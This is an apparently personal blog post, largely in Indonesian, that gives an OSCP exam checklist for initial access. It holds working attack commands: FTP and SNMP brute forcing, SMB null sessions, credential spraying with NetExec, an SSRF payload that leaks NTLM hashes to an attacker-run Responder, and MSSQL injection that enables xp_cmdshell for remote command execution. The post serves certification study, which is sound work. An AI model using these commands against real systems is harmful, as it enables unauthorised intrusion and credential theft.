---
title: "[OSCP] Initial Access - Checklist That Guarantees You to Pwn 'Em All"
author: "novran"
date: 2024-11-27 00:00:00 +0700
categories: ["OSCP Challenge"]
tags: ["Windows Pentest", "Linux Pentest", "FTP Pentest", "SMB Pentest", "Web Pentest", "SNMP Pentest", "OSCP Challenge"]
mermaid: true
image:
  path: /images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all.png
---

Pada tanggal 10 Desember 2024 kemarin, saya memantapkan diri untuk mengambil ujian OSCP. Bisa dibilang agak mendadak, karena Course dan Challenge Lab saya baru jalan sekitar 50%-an. OSCP ini bisa dibilang sebagai "enumeration game" yang di mana untuk menemukan Initial Access saat ujian berlangsung tidak terlalu sulit.

Secara garis besar, maka hal apa saja yang perlu kalian ingat:
- [FTP (21/tcp)](#ftp-21tcp)
- [SMB (445/tcp)](#smb-445tcp)
- [SNMP (161/udp)](#snmp-161udp)
- [[Uncommon Services] Found Weird Port?](#found-weird-port-uncommon-services)
- [Web Application (HTTP)](#web-application-http)
- [Web Application: SSRF to Steal NTLM](#web-application-ssrf-to-steal-ntlm)
- [Web Application: MSSQL Injection to RCE](#web-application-mssql-injection-to-rce)
- [Found Numerous Unnecessary Files?](#found-numerous-unnecessary-files)
- [Found Protected File? Crack It!](#found-protected-file-crack-it)
- [Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials](#some-files-pdf-docx-zip-db-etc-might-contain-credentials)
- [Credential Spraying - FTP, RDP, SMB, SSH, and WinRM](#credential-spraying---ftp-rdp-smb-ssh-and-winrm)

## Port Scan

Untuk melakukan inisiasi, biasanya kita perlu melakukan Port Scanning di awal. Namun, dalam kasus ini, saya tidak akan menggunakan NMAP karena waktu yang tersedia saat ujian OSCP sangat terbatas.

Saat melakukan pengujian dengan beberapa tools, pilihan saya jatuh pada tools berikut:
- [RustScan](https://github.com/RustScan/RustScan) (untuk scan port TCP dengan sangat cepat)
- [UDPX](https://github.com/nullt3r/udpx) (untuk scan port UDP dengan cepat)

TCP:
```bash
rustscan --scripts none -a <TARGET>
```

UDP:
```bash
udpx -c 500 -w 1000 -t <TARGET>
```

## FTP (21/tcp)

Initial Access pada FTP umumnya dapat dilakukan melalui dua cara, yaitu `FTP Anonymous Login` dan `FTP Default Credential Brute Force`.

### FTP Anonymous Login

- [NetExec](https://github.com/Pennyw0rth/NetExec)

```bash
netexec ftp <TARGET> -u 'anonymous' -p 'anonymous'
```

### FTP Default Credential Brute Force

Untuk menemukan Default Credential kita dapat memanfaatkan Tool [Hydra](https://www.kali.org/tools/hydra/) dan Wordlist dari [SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt).

```bash
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET> ftp
```

### Other FTP Cheatsheet

Download file recursively.

```bash
wget -m --user='<USERNAME>' --password='<PASSWORD>' ftp://<TARGET> --no-passive-ftp
```

## SMB (445/tcp)

Ada dua metode initial access yang dapat dicoba pada layanan SMB, yaitu "Null Session" dan "Guest Login".

Untuk memeriksa service SMB, di sini saya menyarankan untuk menggunakan [NetExec](https://github.com/Pennyw0rth/NetExec).

### SMB Null Session

```bash
netexec smb <TARGET> -u '' -p ''
```

### SMB Guest Login

```bash
netexec smb <TARGET> -u 'guest' -p ''
```

### SMB Enumerate Local User

Dengan memanfaatkan 2 kerentanan tersebut biasanya kita bisa memperoleh beberapa Local User yang ada di dalam OS dengan menggunakan [enum4linux](https://www.kali.org/tools/enum4linux/).

```bash
# with null session
enum4linux -a -v <TARGET>

# with guest login
enum4linux -u guest -p '' -a -v <TARGET>

# with credential
enum4linux -u <USERNAME> -p <PASSWORD> -a -v <TARGET>
```

![enum4linux SMB Users Enumeration](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-enum4linux-smb-users-enum.png)

### Other SMB Cheatsheet

Download semua file di dalam SMB secara recursive.

```bash
nxc smb <TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
```

## SNMP (161/udp)

Preparation:
```bash
sudo apt-get install snmp-mibs-downloader -y
sudo download-mibs
```

Initial Access pada SNMP biasanya dilakukan untuk memperoleh kredensial yang tercatat di dalamnya. Dalam SNMP, kita menggunakan "community string" sebagai input (biasanya bernama "public").

### Get Info use Public Community String

```bash
snmpbulkwalk -c public -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

Namun, jika community string bernama "public" tidak tersedia, kita perlu melakukan Brute Force untuk menemukannya.

### Brute Force Community String

Terdapat dua wordlist umum yang dapat digunakan, yaitu SecLists atau Wordlist dari Metasploit Framework.

```bash
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp.txt <TARGET>
```

```bash
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <TARGET>
```

SNMP Walk menggunakan custom community string.

```bash
snmpbulkwalk -c <COMMUNITY_STRING_NAME> -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

## Found Weird Port? (Uncommon Services)

Tak jarang kita menemukan Port dengan angka yang tidak umum, bahkan service-nya tidak akan dikenali oleh NMAP. Tapi, jangan khawatir, kita bisa memanfaatkan Google untuk hal ini.

Google it.
```
port XXX exploit
```

## Web Application (HTTP)

### Enumerate directory and files

- [Feroxbuster](https://github.com/epi052/feroxbuster) and [SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-medium.txt)

```bash
feroxbuster -C 404 --auto-tune -k --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --threads 100 --depth 2 -u <TARGET>
```

- [Dirsearch](https://github.com/maurosoria/dirsearch)

```bash
PYTHONWARNINGS="ignore" python3 ~/dirsearch/dirsearch.py -u <TARGET>
```

### Found an underrated CMS, framework, or application?

Google it
```
<APPLICATION_NAME> exploit
<APPLICATION_NAME_AND_VERSION> exploit
```

### Does the application require login?

- Try `admin:admin`
- or Google it: `<APPLICATION_NAME> default credentials`

## Web Application: SSRF to Steal NTLM

Saya baru menyadari bahwa, celah SSRF (Server-Side Request Forgery) sangat berbahaya pada environment Windows. Yang di mana dapat dimanfaatkan untuk mencuri NTML Hash.

Untuk mengeksekusinya, kita perlu menghidupkan [Responder](https://github.com/SpiderLabs/Responder) terlebih dahulu pada mesin kita.

```bash
sudo python3 Responder.py -I tun0 -wd
```

Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test` dan boom! Responder kalian akan menangkap Request seperti ini.

![SSRF in Responder](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder.png)

Lalu, coba crack NTML-nya.

## Web Application: MSSQL Injection to RCE

Karena SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, kita dapat melakukan escape dan menjalankan query lain. Contohnya seperti ini:
- `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`

Enable "xp_cmdshell":

```sql
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
```

Exec "xp_cmdshell":

```
';EXEC xp_cmdshell "whoami";--
```

## Found Numerous Unnecessary Files?

### Use exiftool to gather username list

Basic:

```
exiftool <FILENAME>
```

Bunch of DOCXs/PDFs

```sh
find . -type f | xargs -I {} exiftool {} | grep ^'Author'
```

And spray it across all services or apps using `<username>:<username>` to log in.

## Found Protected File? Crack It!

You need to crack it.

![anything 2 john](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-file2john.png)

## Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials

## Credential Spraying - FTP, RDP, SMB, SSH, and WinRM

[Netexec](https://github.com/Pennyw0rth/NetExec) adalah tool yang sakti, di mana kita bisa melakukan Credential Spraying ke berbagai layanan seperti FTP, RDP, SMB, SSH, dan WinRM, bahkan dengan berbagai metode yang berbeda.

```bash
netexec winrm <TARGET> -u username.txt -p password.txt
netexec winrm <TARGET> -u 'john' -p password.txt
netexec winrm <TARGET> -u username.txt -p 'Password123'
```

Kita dapat mengubah "winrm" dengan:
- ftp
- smb
- rdp
- ssh
